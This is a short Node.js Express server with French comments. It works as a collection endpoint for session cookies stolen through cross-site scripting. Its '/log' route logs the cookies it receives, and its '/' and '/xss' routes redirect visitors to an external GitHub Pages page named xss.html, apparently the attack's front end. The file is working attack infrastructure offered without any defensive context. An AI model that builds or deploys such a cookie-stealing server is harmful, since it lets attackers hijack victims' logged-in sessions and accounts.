const express = require('express');
const app = express();

// Route pour logger les cookies volés
app.get('/log', (req, res) => {
  console.log('[+] Cookie volé:', req.url);
  res.send('Cookie reçu, merci !');
});


app.get('/', (req, res) => {
  res.redirect('https://aket0.github.io/xss-front/xss.html'); // ← adapte à ton vrai repo si différent
});


app.get('/xss', (req, res) => {
  res.redirect('https://aket0.github.io/xss-front/xss.html'); 
});


app.listen(5000, '0.0.0.0', () => {
  console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
});
